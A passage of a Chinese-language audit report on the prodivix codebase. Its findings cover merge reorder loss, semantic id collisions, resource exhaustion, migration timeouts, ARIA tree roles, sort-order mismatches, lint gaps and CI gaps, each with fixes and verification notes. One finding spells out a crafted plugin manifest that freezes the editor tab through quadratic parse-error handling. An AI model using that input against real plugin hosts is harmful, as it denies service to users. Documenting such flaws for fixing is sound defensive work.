**失败场景**: 某个 animation 文档的 base 内容为 `{svgFiltersById:{f1:{primitives:[{id:'blur',...},{id:'offset',...}]}}}`。用户在本地把 filter 链重排为 `[offset, blur]`(一次真实的渲染变更)。与此同时另一个客户端添加了第三个 primitive,因此 remote 为 `[blur, offset, drop]`。`analyzeWorkspaceThreeWay(base, local, remote)` 在路径 `/svgFiltersById/f1/primitives` 处到达 `mergeValueStates`:`statesEqual(local, remote)` 为 false(3 个 id 对 2 个),`statesEqual(local, base)` 为 **true**(相同的 id 集合、相同的取值),因此第 251 行返回 remote 的 `[blur, offset, drop]`。`merged.conflicts` 为空,`autoRebaseWorkspaceSnapshots` 返回 `{ok:true,status:'rebased'}`,采纳路径替换本地 snapshot,用户的 filter 重排序被永久丢失,既没有冲突提示也没有诊断。`diffWorkspaceSnapshots` 对该重排序同样报告零本地变更(workspaceSemanticDiff.ts:129 使用相同的顺序无关比较),而提交规划器的 `analyzeWorkspaceAuthoringDelta` 使用顺序敏感的 `jsonValuesEqual`,会把同一次重排序视作持久化增量——同一份创作状态存在两个不同的相等性归属方。

**修复建议**: 让 stable-id 数组的相等性判断考虑顺序,或者把顺序作为一项单独合并的事实来处理。具体而言:在 `semanticJsonValuesEqual` 的 stable-id 分支中,在逐 id 的取值比较之后,还要求 `stablePair.left.order` 与 `stablePair.right.order` 深度相等;并在 `mergeStableArrayStates` 中把合并后的 `order` 计算为三份顺序的真正三方合并,当 local 与 remote 对相同的共享 id 做出不同重排时抛出 `'structural'` 冲突,而不是无条件优先采用 `remoteCollection.order`(workspaceThreeWay.ts:233-237)。

**验证备注**: 证据完全吻合(workspaceThreeWay.ts:250-252、jsonValue.ts:113-131、STABLE_ID_ARRAY_FIELDS 见 jsonValue.ts:45-56)。我在一个真实的 pir-graph workspace 上通过 autoRebaseWorkspaceSnapshots 执行了该场景:local = 对 stable-id `nodes` 数组的纯重排序,remote = 追加一个节点。输出为:`diffWorkspaceSnapshots(base, local).changeSet.changes === []`(本地重排序不可见),rebase 返回 ok 且零冲突,合并后 snapshot 的节点顺序是 remote 的,即本地重排序被静默丢弃。注意 mergeStableArrayStates(第 233-236 行)同样以 remote 优先重建 order,因此即便走完整合并路径也是设计上会丢失顺序的。两个归属方之间的不一致是真实的,而且双方都有刻意编写的测试:workspaceSemanticDiff.test.ts:18 'ignores stable node and edge array reorder' 对比 workspaceOperationCommit.test.ts:122 'treats stable-id array reordering as an exact durable content change'(analyzeWorkspaceAuthoringDelta 使用顺序敏感的 jsonValuesEqual)。活跃调用方与描述一致(workspaceRemoteSnapshotAdoption.ts:17 调用 state.setWorkspaceSnapshot(rebased.snapshot))。顺序对 `primitives` **确实**承载语义(AnimationEditorPreviewCanvas.tsx:215、CanvasSvgFilters.tsx:41 按数组顺序渲染 filter.primitives;编译器原样发出 svgFilters)。严重级别从 high 下调:审查者给出的具体触发条件目前不可达——animation 编辑器只做追加(useAnimationEditorState.ts:1150)、保序删除(1171)或属性编辑(1202);apps/web 中不存在任何 primitive/node/edge/timeline 重排序操作,而 keyframes 由 animationCodec.ts:252 按时间排序。因此这是一个已被演示的潜在更新丢失,以及一个真实存在的双相等性归属方不一致,而非当下活跃的数据损坏路径。

##### M-SI-06 Design Token 语义 provider 以 '/' 连接 valuePath 构造引用 fact id,导致同一 token 内的两个引用发生碰撞并中止整个 Workspace Semantic Index 构建

- **位置**: [`packages/tokens/src/designTokenSemanticContributionProvider.ts:291`](packages/tokens/src/designTokenSemanticContributionProvider.ts#L291)
- **类别**: state-data-integrity ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-server-assets-tokens`

**详情**: `contributeToken` 通过 `createSemanticId('design-token-reference', workspaceId, documentId, tokenPath, valueReference.valuePath.join('/'))` 推导每个 `WorkspaceReferenceFact.id`。`createSemanticId` 会对每个*参数*做长度前缀,但 `valuePath` 被以未转义的 `/` 分隔符压平成了单个参数。`valuePath` 的各段是任意的 `$value` 对象键(DTCG codec 对 `$value` 内部的键不施加任何限制 —— 只有 token/group *名称*会经 `isValidName` 检查),因此 `['a/b']` 和 `['a','b']` 都会压平成 `a/b`,产生逐字节相同的 fact id。`collectCanonicalSemanticFacts` 把重复的引用 id 视为硬性的 `duplicate-reference-id` issue,并返回 `createFactCollectionFailure(issues)`(packages/authoring/src/semantic/semanticFacts.ts:274-291, 384),这会让整个 snapshot 构建失败 —— 而不只是这一个文档。

**失败场景**: 某个 token 文档包含 `{"color":{"$type":"color","base":{"$value":"#fff"}},"x":{"$type":"custom","$value":{"a/b":"{color.base}","a":{"b":"{color.base}"}}}}`。`decodeDtcgDesignTokenDocument` 成功,并产出两个 `references`,其 `valuePath` 分别为 `['a/b']` 和 `['a','b']`。`contributeToken` 发出两个 id 均为 `prodivix.semantic.v1:24:design-token-reference:…:3:a/b` 的 fact。`collectCanonicalSemanticFacts` 记录 `duplicate-reference-id` 并返回 ok:false,于是 `createWorkspaceSemanticIndexFromSnapshot` 根本不产出索引:Blueprint/NodeGraph/Animation/Code 中的每一项 symbol、reference、scope、影响查询以及 Issues provider 全部失效,直到用户删掉那一个 token 为止。

**修复建议**: 把 valuePath 的各段作为独立的、带长度前缀的参数传入(`createSemanticId('design-token-reference', workspaceId, documentId, tokenPath, ...valueReference.valuePath)`),或者在连接前对每一段做转义,使不同的 valuePath 永远不可能产生相同的 id。

**验证备注**: 已在 packages/tokens 中用一次性 vitest 探针端到端复现。`decodeDtcgDesignTokenDocument` 接受了 `{color:{$type:'color',base:{$value:'#ffffff'}},x:{$type:'custom',$value:{'a/b':'{color.base}',a:{b:'{color.base}'}}}}`(ok:true),并产出两个 valuePath 分别为 `['a','b']` 和 `['a/b']` 的引用 —— 这证实 codec 只对 token/group *名称*应用 `isValidName`(dtcgDesignTokenCodec.ts:151-156, 329-337),对 `$value` 内部的键不作任何限制(collectValueReferences 在第 607-618 行对原始 `Object.entries` 递归)。provider 随后发出了两个逐字节相同的 id:均为 `prodivix.semantic.v1:22:design-token-reference:2:ws:3:doc:1:x:3:a/b`(UNIQUE 1 / TOTAL 2)。`createSemanticId` 对每个*参数*做长度前缀(semanticIds.ts:5-21),其自身的文档注释也承诺 `/` 绝不会造成碰撞 —— 预先连接 valuePath 恰恰破坏了这一保证。下游情况与描述一致:`collectUniqueFact` 记录 `duplicate-reference-id`,`collectCanonicalSemanticFacts` 在 semanticFacts.ts:384 返回 `createFactCollectionFailure(issues)`,而 `createWorkspaceSemanticIndex` 原样返回该失败(createWorkspaceSemanticIndex.ts:397,注释:不产出部分索引)。该 provider 已被组合进真实的生产构建(createWorkspaceSemanticIndexFromSnapshot.ts:616,由 apps/web/src/editor/codeLanguage/workspaceCodeLanguageEnvironment.ts:174 使用)。严重性由 high 修正为 medium:触发条件是一种做作但合法的 token 形态(需要一个含 `/` 的 `$value` 键,再加上*同一个 token* 内一处能压平成同样字符串的兄弟嵌套),没有任何东西被错误持久化,且失败发生在可重建的读投影中,只要编辑该 token 即可恢复。

#### 4.3.8 资源耗尽(resource-exhaustion)

##### M-RX-01 无界的解析错误扇出叠加逐错误的线性位置扫描,使 manifest 解析在不可信输入上呈平方级复杂度

- **位置**: [`packages/plugin-contracts/src/parseStrictJsonDocument.ts:277`](packages/plugin-contracts/src/parseStrictJsonDocument.ts#L277)
- **类别**: resource-exhaustion ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-protocol-contracts`

**详情**: jsonc-parser 的 `parse()` 是容错的:它不会在第一个语法错误处停止,而是为每个恢复点追加一个 `ParseError`(参见 jsonc-parser 中的 `parseArray`/`parseObject`,它们对每个多余的分隔符 token 调用一次 `handleError(ValueExpected, ...)`)。`parseStrictJsonDocument` 随后把收集到的*每一个*错误都经 `parseErrorDiagnostic` 映射,而后者会调用 `positionAt(source, error.offset)` —— 一个从索引 0 循环到该错误偏移的过程(第 70 行)。当长度为 N 的源码中散布 N 个错误时,这就是 O(N^2) 次字符比较,外加 N 个完全物化的 `PluginDiagnostic` 对象,全部同步执行且不加限制地返回。整条链路上任何位置都没有诊断数量上限:`parseAndValidatePluginManifest` 原样返回 `parseResult`,`packages/plugin-host/src/lifecycle/hostValidation.ts:73-80` 通过 `asNonEmptyDiagnostics`/`pluginHostFailure` 转发整个数组。

**失败场景**: 一个恶意插件包附带一个 262,144 字节的 `manifest.json`(恰好等于 `DEFAULT_STRICT_JSON_MAX_BYTES`),内容为一个 `[` 后跟约 262,000 个 `,` 字符。`decodeSource` 接受它(大小与 UTF-8 检查均通过)。`parse` 大约为每个逗号发出一个 `ParseError`,于是 `parseErrors.map(...)` 以平均约 131,000 的偏移调用 `positionAt` 约 262,000 次,即在调用线程上执行约 3.4e10 次循环迭代,并分配约 262,000 个诊断对象。`readAndValidatePluginManifest` 在任何能力或信任级别授权之前就在浏览器主线程上同步运行这段逻辑,因此仅仅尝试安装该包就会让编辑器标签页冻结数分钟,并可能导致 OOM。插件提供的 contribution 资源(`documentKind: 'contribution'`)存在完全相同的路径。

**修复建议**: 限制上报的解析错误数量(例如 `parseErrors.slice(0, 32)` 加上一条 "N further errors suppressed" 诊断),并用一次预计算的行起始索引(一次 O(n) 扫描 + 每个错误做二分查找)来计算行/列,而不是在 `positionAt` 中每次都从偏移 0 重新扫描。对 `findDuplicateKeys` 施加同样的上限。

**验证备注**: 证据与 parseStrictJsonDocument.ts:274-281 原样吻合,`positionAt`(第 62-77 行)确实是对每个错误从索引 0 开始的线性扫描。针对真实的 jsonc-parser 构建做了测量:`'[' + ','.repeat(n)` 产生 n+2 个 ParseError 且无任何上限(n=1000 -> 1002 个错误,n=100000 -> 100002 个错误),偏移为 1..n+1。在一次临时 vitest 探针(已删除)中测量了真实的 `parseStrictJsonDocument(text, { documentKind: 'manifest' })`:n=20000 -> 20002 条诊断,耗时 185 ms;n=262143(恰好 DEFAULT_STRICT_JSON_MAX_BYTES = 262144 字节)-> 262145 条诊断,同步耗时 42,229 ms。下游任何位置都不存在上限:parseAndValidatePluginManifest 原样返回 parseResult,hostValidation.ts:73-80 通过 asNonEmptyDiagnostics/pluginHostFailure 转发整个数组。授权前即可在浏览器主线程上到达:availabilityLifecycle.ts:96 -> readAndValidatePluginManifest,而 host 在 apps/web/src/plugins/platform/createWebPluginPlatform.ts:150 构造(不在 worker 中);contributionPreparation.ts:309 以 documentKind 'contribution' 走同一路径。严重性由 high 下调:审查者所说的"冻结数分钟"高估了实际情况(实测约 42 秒),触发条件要求用户主动安装一个恶意包,影响是可恢复的可用性损失(标签页冻结 / 可能 OOM),不涉及数据损坏、不涉及持久化、也不带来权限提升。

##### M-RX-02 以 8 MB maxBuffer 读取共享的安装代理容器全量日志,一旦日志增长就会永久性地让每次执行失败

- **位置**: [`apps/remote-runner-worker/src/rootlessPodmanSandbox.ts:1529`](apps/remote-runner-worker/src/rootlessPodmanSandbox.ts#L1529)
- **类别**: resource-exhaustion ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-runner-worker`

**详情**: 每次执行之后,worker 会以 `maxBuffer: 8 * 1024 * 1024` 运行 `podman logs <proxyContainer>` 来取回安装出网追踪。安装代理是一个长期存在、预先置备的基础设施容器(README:"`REMOTE_WORKER_INSTALL_PROXY_CONTAINER`: infrastructure proxy container";G2 工作流以 `podman run --detach` 和默认日志驱动启动它,没有 `--log-opt max-size`)。因此它的日志会为*所有*执行、*所有*共享该代理的 worker 的每一次 CONNECT 累积一行约 230 字节的 JSON 追踪,并且从不被截断、轮转,也不用 `--since` 过滤。一旦 stdout 超过 `maxBuffer`,`execFile` 就会立即杀掉子进程并以 `ERR_CHILD_PROCESS_STDIO_MAXBUFFER` 拒绝;外层的 `catch` 又把它转换成一次硬性的执行失败。

**失败场景**: 一支 worker 机队共享一个安装代理。在累计约 35k 条 CONNECT 追踪之后(约 1-2k 次执行,每次约 20 个 socket),`podman logs` 的输出会超过 8 MB。从那一刻起,每一次执行 —— 无论其自身的安装过程是否发起过任何网络请求 —— 都会走进 catch 分支并返回 `status:'failed', exitCode:125, reason:'invalid-network-trace'`,把一次本该成功的 Preview/Build/Test/Server Function 结果丢弃。该故障会一直持续到运维人员重启或截断该代理容器为止;worker 内部没有任何机制能从中恢复。

**修复建议**: 把读取范围限定在本次执行:在 `podman run` 之前记录时间戳并传入 `podman logs --since <ts>`(或改用每次执行独立的代理,或把 `--follow` 流式送入一个有界的解析器)。此外,把 maxBuffer/传输错误与追踪格式错误区分开,以免日志体积问题被静默地表现为策略违规。

**验证备注**: rootlessPodmanSandbox.ts:1527-1550 与引用一致:`podman logs <proxyContainerName>`,maxBuffer 为 8 MiB,没有 --since、没有 --tail,外层 catch 把任何拒绝都转换成 status 'failed'、exitCode 125、reason 'invalid-network-trace',并丢弃一个本来成功的结果(1552 及之后的成功路径永远到不了)。该代理是长期存在且共享的:main.ts:63 从环境变量读取 REMOTE_WORKER_INSTALL_PROXY_CONTAINER,worker 只对它做 inspect/使用(行 381、396、418、455、465、471、1531),从不重启、轮转或截断它,而 .github/workflows/g2-rootless-sandbox.yml:147-157 以 `podman run --detach` 启动它且没有 --log-opt max-size。install-proxy/entry.mjs:96-98、161-177 对每个 socket 无条件向 stdout 写一行约 200-250 字节的 JSON 追踪,对每一次执行和每一个共享该代理的 worker 都是如此;按 installTraceId 过滤只发生在整份日志被读入之后。execFile 的 maxBuffer 语义确如所述(子进程被杀,promise 以 ERR_CHILD_PROCESS_STDIO_MAXBUFFER 拒绝)。严重性由 high 修正为 medium:这确实是一个带硬失败转换的无界增长设计缺陷,但需要累积数万条 CONNECT 追踪才会触发,其发生时点取决于部署所用的 podman 日志驱动/journald 保留策略(仓库并未固定),且运维人员重启代理即可恢复 —— 没有数据损坏,也没有安全影响。

#### 4.3.9 迁移安全(migration-safety)

##### M-MS-01 整套迁移(含一次完整的 PIR 表重写)在单个事务中以硬性 2 分钟超时运行,可能造成不可恢复的启动崩溃循环

- **位置**: [`apps/backend/internal/platform/database/database.go:38`](apps/backend/internal/platform/database/database.go#L38)
- **类别**: migration-safety ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-platform`

**详情**: OpenDatabase 把 RunMigrations 包裹在一个 2 分钟的 context 中。RunMigrations 为全部 13 个迁移打开单个事务。迁移 12(`migratePersistedPIRDocuments`)会执行 `LOCK TABLE workspace_documents IN SHARE ROW EXCLUSIVE MODE`,然后以 256 为批次遍历每一行 pir-page/pir-layout/pir-component,对每份文档运行 `pircontract.UpgradeDocument`——它会执行一次完整的 JSON-Schema 校验(jsonschema/v6)——并对每一行已迁移记录执行一次 UPDATE,全都在同一个事务和同一个 2 分钟预算内。既没有按迁移划分的预算,也没有可恢复性,更没有带外运行迁移的途径。

**失败场景**: 一个持有约 10 万份 PIR 文档的 workspace 数据库部署了该二进制。每份文档的解码+schema 校验开销(个位数毫秒)会使迁移 12 在中途超出 120 秒的 ctx 截止时间。`tx.ExecContext` 以 context deadline exceeded 失败,延迟执行的 `tx.Rollback()` 丢弃全部工作,RunMigrations 返回错误,OpenDatabase 关闭连接池并返回,NewServer 失败,main.go 调用 log.Fatal。下一次启动重复完全相同的工作并在同一位置失败:该服务再也无法启动。与此同时,每一次尝试都会在 workspace_documents 上持有 SHARE ROW EXCLUSIVE 锁两分钟,阻塞仍在运行的副本上的所有 Atomic Commit。

**修复建议**: 给数据重写型迁移各自独立的事务和各自(或无界/由运维人员指定)的截止时间,并通过记录批次进度使其可恢复,这样超时不会丢弃已完成的工作。至少要让超时来自配置而非硬编码的 2 分钟,并把 `run` 式数据迁移与 DDL 迁移分开,使 DDL 可以独立提交。

**验证备注**: 每一条机械性论断都核对无误。database.go:38 把 RunMigrations 包裹在硬性的 context.WithTimeout(2*time.Minute) 中;RunMigrations 在 database.go:571 打开唯一一个 db.BeginTx,并在第 608 行提交一次,因此全部 13 个迁移共享该事务和该截止时间。版本 12 的迁移(database.go:543-545)设置 run: migratePersistedPIRDocuments,它发出 LOCK TABLE workspace_documents IN SHARE ROW EXCLUSIVE MODE,然后以 256 为批次、带 FOR UPDATE 对每一行 pir-page/pir-layout/pir-component 做 keyset 遍历,并逐行调用 pircontract.UpgradeDocument;UpgradeDocument(migration.go:533)无条件调用 ValidateDocument,后者对每一份文档(无论是否被迁移)都执行一次完整的 jsonschema/v6 Validate(contract.go:43-49),之后还有 ALTER TABLE ... VALIDATE CONSTRAINT。既没有按迁移划分的预算,也没有带外运行器:RunMigrations 只有一个非测试调用方,即 OpenDatabase。截止时间到期时,延迟执行的 tx.Rollback 丢弃全部工作,下一次启动重试完全相同的工作,因此崩溃循环确实可能发生。严重级别从 high 下调:这是一项启动可用性风险,需要事先存在大规模 PIR 语料(全新或规模适中的部署会在数秒内完成,且该迁移在 schema_migrations 中只记录一次),事务会原子回滚因而没有数据损坏,运维人员也保有恢复途径(更大的实例、以更长预算重新构建的二进制)。

#### 4.3.10 可访问性(accessibility)

##### M-A11Y-01 PdxTree 的 treeitem 角色不由 tree/group 拥有,因此树结构没有暴露给辅助技术

- **位置**: [`packages/ui/src/data/PdxTree.tsx:85`](packages/ui/src/data/PdxTree.tsx#L85)
- **类别**: accessibility ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-official-ui`

**详情**: `role="tree"` 位于外层容器(第 130 行),`role="group"` 位于子容器(第 113 行),但每个 `role="treeitem"` 都是嵌套在两层通用 `<div>` 之内的 `<button>`(`div.PdxTreeNode` → `div.PdxTreeRow` → `button[role=treeitem]`)。ARIA 要求 `tree`/`group` 直接拥有(或通过 `aria-owns` 拥有)`treeitem` 元素;带有隐式 `generic` 角色的中间元素会破坏这一拥有关系,导致可访问性树根本不会报告存在一棵树。此外,`aria-expanded` 被放在一个*单独的*兄弟切换按钮上(第 86 行),而不是放在 treeitem 上,并且没有输出任何 `aria-level`/`aria-setsize`/`aria-posinset`。

**失败场景**: 屏幕阅读器用户打开一个 `data = [{ id: 'a', label: 'Root', children: [{ id: 'b', label: 'Child' }] }]` 的 PdxTree。由于 treeitem 不被 tree 拥有,NVDA/VoiceOver 会把它们朗读为两个互不相关的按钮("Expand Root, button" 和 "Root, button"),没有树模式、没有层级、没有集合内位置,项目本身也没有展开/折叠状态。用户无法判断层级结构,也无法使用树导航按键。

**修复建议**: 把 `role="treeitem"` 移到 `div.PdxTreeRow` 上,并让 `div.PdxTreeNode` 要么本身成为 treeitem,要么设为 `role="none"`/`role="presentation"`,使 `tree` → `treeitem` → `group` 的拥有关系是直接的。把 `aria-expanded`、`aria-selected`、`aria-level`、`aria-setsize` 和 `aria-posinset` 放到 treeitem 上,并把箭头图标做成纯装饰性的 `aria-hidden` 元素,由 treeitem 来触发切换。

**验证备注**: 引用的证据与 PdxTree.tsx 完全一致(role="treeitem" 在第 106 行,role="group" 在 113 行,role="tree" 在 130 行)。但审查者的核心机理是错误的:WAI-ARIA 术语表把"被拥有元素"定义为容器的*任意 DOM 后代*,因此中间的 div.PdxTreeNode / div.PdxTreeRow 并不会破坏 tree->treeitem 的拥有关系,"可访问性树根本不会报告存在一棵树"这一说法也缺乏依据。我用审查者给出的完全相同的夹具数据 data=[{id:'a',label:'Root',children:[{id:'b',label:'Child'}]}] 运行 axe-core(它已是 devDependency,packages/ui/src/test/accessibility.test.tsx 在用)做了实证验证:axe 对未被拥有/缺失的 treeitem 没有提出任何问题。它只报出一条违规:aria-required-children(影响级别 critical),位于 <div class="PdxTree" role="tree"> 上:"Element has children which are not allowed: button[aria-label]"。这指的是第 84-97 行的展开/折叠切换按钮 —— 一个 role=button 的 role=tree 后代,它不是被允许拥有的角色,并且它承载着 ARIA 要求放在 treeitem 本身上的 aria-expanded 状态。因此该组件中确实存在一个由工具证实的 WCAG 4.1.2 缺陷,审查者也确实点到了它(aria-expanded 放在兄弟节点上那一点),但作为标题的拥有关系/嵌套机理是对 ARIA 的误读。已把定位改到切换按钮(第 85 行),即被证实的违规实际所在之处。严重性维持 medium:axe 把影响评为 critical,但 PdxTree 处于 'lab' 成熟度(componentManifest.ts:416),且危害是可访问性/UX 降级,而非数据丢失。

#### 4.3.11 确定性(determinism)

##### M-DET-01 sandbox 用依赖区域设置的 localeCompare 校验 Secret 字段顺序,而 host 按码元排序,导致合法的字段名组合被确定性地拒绝

- **位置**: [`apps/remote-runner-worker/sandbox/entry.mjs:744`](apps/remote-runner-worker/sandbox/entry.mjs#L744)
- **类别**: determinism ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-runner-worker`

**详情**: secret 字段列表的每一个生产者都按 UTF-16 码元排序:`readIsolatedServerFunctionSecretMaterial`(packages/server-runtime/src/isolatedServerRuntime.ts:117)强制 `entries[index-1][0] >= field`,`createRootlessPodmanSandboxWirePayload`(rootlessPodmanSandbox.ts:273-276)与 `Object.keys(secretPolicy.secretsByField).sort()` 比对。而 sandbox 入口用 `localeCompare` 重新校验同一份列表,后者使用的是 ICU 根排序规则。两种排序在 `_` 与大写字母相遇时(码元中 `_` 为 0x5F,大于 `A`-`Z`,但 ICU 把标点排在所有字母之前)以及仅大小写不同时会产生分歧。由于这一检查发生在顶层载荷校验期间、安装之前,整次执行会直接中止。

**失败场景**: 一个 Server Function 声明了仅作引用的 Secret 字段 `APIKEY` 和 `API_KEY`。host 生成按码元排序的列表 `["APIKEY","API_KEY"]`(已验证:`['API_KEY','APIKEY'].sort()` -> `["APIKEY","API_KEY"]`)。sandbox 求值 `'APIKEY'.localeCompare('API_KEY')` 得到 1,于是 `index > 0 && fields[index-1].localeCompare(field) >= 0` 成立,抛出 `'Server Function invocation projection is invalid.'`。顶层 catch 以空输出发出 `exitCode 125`,worker 报告 `invalid-sandbox-result`,该函数永远无法被远程调用。`Token`/`token` 会遭遇同样的情况(`'Token'.localeCompare('token') === 1`)。

**修复建议**: 把 `fields[index - 1].localeCompare(field) >= 0` 换成码元比较(`fields[index - 1] >= field`),使 sandbox 与 `readIsolatedServerFunctionSecretMaterial` 和 `Array.prototype.sort` 使用完全相同的排序。

**验证备注**: sandbox/entry.mjs:740-747 与引用一致,并且在 profile 为 'production' 时于顶层载荷校验期间、安装之前运行,抛出 'Server Function invocation projection is invalid.'。每一个生产者都按 UTF-16 码元排序:isolatedServerRuntime.ts:114-124 在 entries[index-1][0] 不小于 field(码元 >=)时拒绝该 material,apps/backend/.../isolated_secret_broker.go:326 使用 sort.Strings(字节序),rootlessPodmanSandbox.ts:273-276 与 Object.keys(secretPolicy.secretsByField).sort() 比对,然后发送 secretFields = Object.keys(secretMaterial.fields)(rootlessPodmanSandbox.ts:277-279、302-305),remoteWorkerSecretRecipient.ts:128 使用 [...expected.fields].sort()。在 Node 中已验证:['API_KEY','APIKEY'].sort() -> ['APIKEY','API_KEY'],而 'APIKEY'.localeCompare('API_KEY') === 1;['Token','token'].sort() -> ['Token','token'],而 'Token'.localeCompare('token') === 1 —— 因此 sandbox 会拒绝 host 认为是 canonical 的载荷。字段名允许同时包含 '_' 和大小写混合(serverRuntimeProfile.ts:65-70 的 isCanonicalId 与 isolatedServerRuntime.ts:154-161 的 authorityPermissionId 都使用 /^[A-Za-z0-9][A-Za-z0-9._:-]*$/)。需要说明的是,readEnvironmentPolicy(serverRuntimeProfile.ts:164)也用 localeCompare 排序,但 host 在比较前会用 .sort() 重新排序,因此 host 一侧保持自洽,分歧只在 sandbox 内部显现。这一点没有任何覆盖:所有测试和 G2 verify 脚本都只使用单个 secret 字段(rootlessPodmanSandbox.test.ts:298,verify-rootless-sandbox.ts:535)。严重性由 high 修正为 medium:失败关闭,无安全或持久化影响,且需要一个 Server Function 声明两个或更多仅在大小写上不同、或含有与字母相邻的 '_' 的 Secret 字段名。

#### 4.3.12 构建配置(build-config)

##### M-BC-01 唯一的 lint 门禁只在 51 个 workspace 包中的 3 个里运行 ESLint;所有 packages/* 以及 sandbox/runner 应用从未被 lint

- **位置**: [`package.json:90`](package.json#L90)
- **类别**: build-config ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `infra-gates`

**详情**: 根 `lint` 是 `turbo run lint && …`。Turbo 会静默跳过任何没有 `lint` 脚本的包,而只有 `@prodivix/web`、`@prodivix/cli` 和 `@prodivix/vscode` 定义了该脚本(通过枚举每个被跟踪的 `package.json` 验证)。因此每一个 `packages/*` 模块 —— 包括 `@prodivix/workspace`、`@prodivix/prodivix-compiler`、`@prodivix/plugin-host`、`@prodivix/server-runtime` —— 以及对安全至关重要的 `remote-runner-worker`、`remote-runner-control-plane`、`asset-delivery-host`、`plugin-sandbox` 应用,都从未经过 ESLint。结果是 `js.configs.recommended` + `tseslint.configs.recommended` 规则集,以及显式添加的 `@typescript-eslint/no-explicit-any: 'error'`(由提交 `chore(lint): ban explicit any across the codebase` 添加),只在 `apps/web` 内部生效。`.github/workflows/tests.yml:1683` 中的 `Lint` 步骤是 CI 中唯一的 lint 作业,因此无论那 48 个包里是什么内容,该门禁都会报告成功。

**失败场景**: `packages/plugin-host/src/lifecycle/runtimeLifecycle.ts:158` 含有 `} catch {}`,ESLint 核心规则 `no-empty`(由 `js.configs.recommended` 启用,`allowEmptyCatch` 默认为 false)会将其报为 error。但运行 `pnpm run lint` 会报告零问题,因为 `@prodivix/plugin-host` 没有 `lint` 脚本,于是这处吞掉错误的位置 —— 以及 `plugin-host`/`plugin-browser` 中另外五处同类位置 —— 在任何门禁都不会失败的情况下被发布出去。

**修复建议**: 在仓库根添加一份共享的 flat ESLint 配置,并为每个 workspace 包添加 `lint` 脚本(或者作为额外的 CI 步骤运行一次覆盖 `apps/**` 与 `packages/**` 的根级 `eslint .`),让 `no-explicit-any` / `no-empty` / `no-unsafe-*` 规则集真正在全仓库生效。

**验证备注**: 已用 `turbo run lint --dry=json` 做实证验证:依赖图中有 50 个包,其中只有 `@prodivix/cli`(`eslint src`)、`@prodivix/vscode`(`eslint src`)、`@prodivix/web`(`eslint .`)解析出真实命令 —— 其余每一项都是 `<NONEXISTENT>`,包括 plugin-host、workspace、prodivix-compiler、server-runtime、golden-conformance、asset-delivery-host、plugin-sandbox、remote-runner-worker 和 remote-runner-control-plane。`package.json:90` 与引用完全一致,`turbo.json` 的 lint 任务是 `{"outputs": []}`,而 `.github/workflows/tests.yml:42`(`run: pnpm run lint`)是全部 17 个工作流中唯一的 lint 调用。`apps/web/eslint.config.js` 确实在 `js.configs.recommended` + `tseslint.configs.recommended` 之上设置了 `'@typescript-eslint/no-explicit-any': 'error'`,提交 `296080f3 chore(lint): ban explicit any across the codebase` 也确实存在。packages/plugin-host/src/lifecycle/runtimeLifecycle.ts:158 处的 `} catch {}` 与引用一致,`no-empty`(allowEmptyCatch 默认为 false)会标记它。审查者漏掉的一个细节:仓库根存在一份遗留的 `.eslintrc.cjs`,但 ESLint 9 的 flat config 会忽略它,而且根目录下没有任何地方调用 eslint,因此它不改变结论。严重性由 high 下调为 medium:这是质量门禁中的 lint 覆盖缺口,而非运行时或数据完整性缺陷,且未被 lint 的包仍受严格 `tsc` 与 vitest 覆盖。

#### 4.3.13 CI 覆盖(ci-coverage)

##### M-CI-01 G2 Vue/Vite 独立包浏览器门禁在所有 GitHub 工作流中都不可达

- **位置**: [`packages/golden-conformance/package.json:16`](packages/golden-conformance/package.json#L16)
- **类别**: ci-coverage ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `infra-gates`

**详情**: `src/goldenG2VueTarget.browser.test.ts` 由 `describe.runIf(process.env.PRODIVIX_VERIFY_G2_VUE_TARGET === '1')` 守卫。唯一设置该变量的脚本是 `test:g2-vue-target`,而它只能从根 `verify:g2:vue-target`(package.json:54)到达。把根 `package.json` 中的每个脚本与 `.github/workflows` 中的每个文件交叉比对可知,`verify:g2:vue-target` 没有被任何工作流调用,它也不属于本地聚合链(`verify:g2` -> `verify:g2:local-closure` -> `data-closure` 运行的是 `verify:g2:vue-product`,后者只设置 `PRODIVIX_VERIFY_G2_VUE_PRODUCT`)。三个同级浏览器门禁(`goldenG1Browser`、`goldenG1Standalone`、`goldenG2VueCatalog*`)都分别接入了 `g0-g1-gates.yml` / `g2-data-closure.yml`;唯独这一个没有。然而它仍被 `specs/roadmap/g2-closure-evidence.md:53` 列为 G2 收口的复现命令。

**失败场景**: 生成的 Vue/Vite 独立包出现回归 —— 例如 `createGoldenG2VueProjectedBundle` 产出的 bundle 其 `pnpm install/typecheck/test/build` 失败,或其 CRUD 界面不再更新 `data-products:update-product` —— 却能通过所有 PR 和 push 工作流。默认的 `pnpm test`(turbo)也会运行该文件,但缺少该环境变量时 `describe.runIf` 求值为 false,于是测试套件把该文件报告为跳过而不是失败。

**修复建议**: 在 `.github/workflows/g2-data-closure.yml` 的 `vue-vite-portability` 作业中加入一个 `pnpm run verify:g2:vue-target` 步骤(该作业已通过 `E2E_BROWSER_CHANNEL` 安装 Chrome),或者把 `test:g2-vue-target` 并入 `verify:g2:vue-product`,让这个受环境变量控制的浏览器套件真正在 CI 中执行。

